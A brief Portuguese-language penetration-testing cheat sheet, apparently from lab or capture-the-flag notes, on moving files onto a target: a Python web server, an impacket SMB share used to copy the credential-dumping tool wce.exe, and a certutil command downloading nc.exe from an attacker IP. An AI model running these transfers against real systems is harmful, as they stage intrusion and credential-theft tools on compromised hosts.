## Servidor web
```bash
python3 -m http.server 80
```
## SMB Client
```bash
# Iniciar o servidor na maquina atacante
python3 /opt/impacket/examples/smbserver.py -smb2support lord /tmp 

# Copiar arquivos na máquina alvo
copy \\10.10.14.8\lord\wce.exe .
```

Utilizando o Certutil:
```powershell
certutil -urlcache -f http://10.10.14.2:81/nc.exe %TEMP%/nc.exe
```
